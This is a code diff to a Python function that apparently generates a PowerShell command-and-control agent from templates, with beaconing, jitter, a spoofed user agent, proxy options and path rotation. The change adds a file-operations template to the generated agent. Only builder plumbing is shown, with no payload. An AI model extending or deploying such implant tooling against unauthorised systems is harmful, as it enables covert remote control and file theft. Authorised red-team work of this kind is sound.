@@ -261,7 +261,7 @@ def generate_from_templates(server_address, beacon_path, cmd_result_path,
                            random_sleep_enabled="$false", max_sleep_time=10, user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                            username="", password="", proxy_enabled="$false", proxy_type="system",
                            proxy_server="", proxy_port=""):
-    """Generate the PowerShell agent code from templates with all the new options"""
+    """Generate the PowerShell agent code from templates with all options"""
     
     # Get template paths
     script_dir = os.path.dirname(os.path.abspath(__file__))
@@ -269,6 +269,7 @@ def generate_from_templates(server_address, beacon_path, cmd_result_path,
     
     agent_template_path = os.path.join(helpers_dir, "agent.template.ps1")
     path_rotation_template_path = os.path.join(helpers_dir, "path_rotation.template.ps1")
+    file_operations_template_path = os.path.join(helpers_dir, "file_operations.template.ps1")
     
     # Ensure template files exist
     if not os.path.exists(agent_template_path):
@@ -281,6 +282,14 @@ def generate_from_templates(server_address, beacon_path, cmd_result_path,
         agent_template = f.read()
     with open(path_rotation_template_path, 'r') as f:
         path_rotation_template = f.read()
+    
+    # Load file operations template if it exists
+    file_operations_code = ""
+    if os.path.exists(file_operations_template_path):
+        with open(file_operations_template_path, 'r') as f:
+            file_operations_code = f.read()
+    else:
+        print(f"Warning: File operations template not found: {file_operations_template_path}")
     
     # Fill in the path rotation template
     path_rotation_code = ""
@@ -298,6 +307,7 @@ def generate_from_templates(server_address, beacon_path, cmd_result_path,
     agent_code = agent_code.replace("{{BEACON_PATH}}", beacon_path)
     agent_code = agent_code.replace("{{CMD_RESULT_PATH}}", cmd_result_path)
     agent_code = agent_code.replace("{{PATH_ROTATION_CODE}}", path_rotation_code)
+    agent_code = agent_code.replace("{{FILE_OPERATIONS_CODE}}", file_operations_code)
     agent_code = agent_code.replace("{{BEACON_INTERVAL}}", str(beacon_interval))
     agent_code = agent_code.replace("{{JITTER_PERCENTAGE}}", str(jitter_percentage))
     agent_code = agent_code.replace("{{MAX_FAILURES}}", str(max_failures))
